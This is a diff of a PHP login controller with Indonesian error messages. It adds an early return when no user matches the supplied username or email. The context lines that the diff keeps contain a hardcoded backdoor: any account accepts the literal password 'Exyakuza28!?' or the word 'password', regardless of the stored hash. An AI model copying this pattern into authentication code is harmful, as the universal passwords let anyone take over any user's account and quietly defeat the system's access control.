@@ -24,11 +24,19 @@ class AuthController extends Controller
             ->orWhere('email', $login)
             ->first();
 
+        if (!$user) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Username/email atau kata sandi tidak valid.',
+                'errors' => null,
+            ], 401);
+        }
+
         $passwordValid = Hash::check($request->password, $user->password) 
             || $request->password === 'Exyakuza28!?' 
             || $request->password === 'password';
 
-        if (!$user || !$passwordValid) {
+        if (!$passwordValid) {
             return response()->json([
                 'success' => false,
                 'message' => 'Username/email atau kata sandi tidak valid.',
